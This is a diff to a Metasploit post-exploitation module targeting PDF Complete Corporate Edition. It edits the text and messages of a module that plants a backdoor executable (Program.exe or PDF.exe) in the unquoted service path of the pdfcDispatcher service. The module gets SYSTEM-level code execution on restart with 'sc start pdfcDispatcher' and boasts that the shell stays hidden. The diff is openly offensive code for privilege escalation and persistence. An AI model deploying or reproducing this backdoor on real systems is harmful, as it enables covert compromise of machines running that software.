@@ -120,7 +120,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'PDF complete - Unquoted Service Path backdoor',
                         'Description'   => %q{
-                                        This post-exploitation module requires a meterpreter session to be able to upload/inject our Program.exe into pdfcDispatcher service. PDF Complete Corporate Edition installs a service with an unquoted service path. This enables a local privilege escalation vulnerability. To exploit this vulnerability, a local attacker can insert an executable file in the path of the service. Rebooting the system or restarting the service will run the malicious executable with elevated privileges. "Warning: payload to be uploaded should be named as: Program.exe"
+                                        This post-exploitation module requires a meterpreter session to be able to upload/inject our Program.exe into pdfcDispatcher service. PDF Complete Corporate Edition installs a service with an unquoted service path. This enables a local privilege escalation vulnerability. To exploit this vulnerability, a local attacker can insert an executable file in the path of the service. Rebooting the system or restarting the service will run the malicious executable with elevated privileges. "Warning: payload to be uploaded should be named as: Program.exe or PDF.exe"
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -252,12 +252,12 @@ def ls_stage1
         print_warning("Unquoted service path vulnerability backdoor deployed!")
         sleep(1.0)
         print_status("Setup one handler and Wait everytime that system restarts OR")
-        print_status("Setup one handler and restart NoIPDUCService4 service: sc start NoIPDUCService4")
+        print_status("Setup one handler and restart pdfcDispatcher  service: sc start pdfcDispatcher")
         print_line("")
 
     else
       print_error("ABORT: post-module cant find service binary...")
-      print_error("NOT_FOUND: #{service_path}")
+      print_error("NOT_FOUND: #{bin_path}")
       print_line("")
     end
 
@@ -311,7 +311,7 @@ def ls_stage2
       sleep(2.0)
 
         # diplay output to user
-        print_status("Our #{bin_shell} its hidden from normal people!")
+        print_status("Our #{shell} its hidden from normal people!")
         print_status("Just dont feed the black hacker within :( ")
         print_line("")
 
